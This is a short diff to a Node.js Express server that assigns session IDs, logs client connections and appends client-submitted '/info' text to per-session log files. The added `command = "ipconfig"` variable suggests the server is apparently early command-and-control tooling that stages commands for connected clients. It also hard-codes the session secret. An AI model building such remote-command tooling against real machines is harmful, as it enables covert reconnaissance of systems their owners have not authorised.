@@ -6,6 +6,8 @@ var session = require('express-session');
 
 const app = express();
 
+var command = "ipconfig";
+
 app.use(session({
 	secret: "keyboardCat",
 	resave: false,
@@ -14,9 +16,9 @@ app.use(session({
 
 app.get('/', (req, res) => {
 	sid = req.sessionID;
-	console.log(sid);
+	console.log((`${sid} has connected`));
 	fs.writeFile(`Sessions/${sid}.log`, "Connection Established\n", err => {
-  		if (err) throw console.error(err);
+  		if (err) console.error(err)
 	})
 	res.send(`${sid}`);
 });
@@ -28,7 +30,7 @@ app.get('/info', (req, res) => {
         var InfoText = req.query.info;
         console.log(`${sid}: ${InfoText}`)
 		fs.appendFile(`Sessions/${sid}.log`, `${InfoText}\n`, err => {
-		  	if (err) throw console.error(err);
+		  	if (err) console.error(err)
 		})
     }
     res.send("Information Sent!")
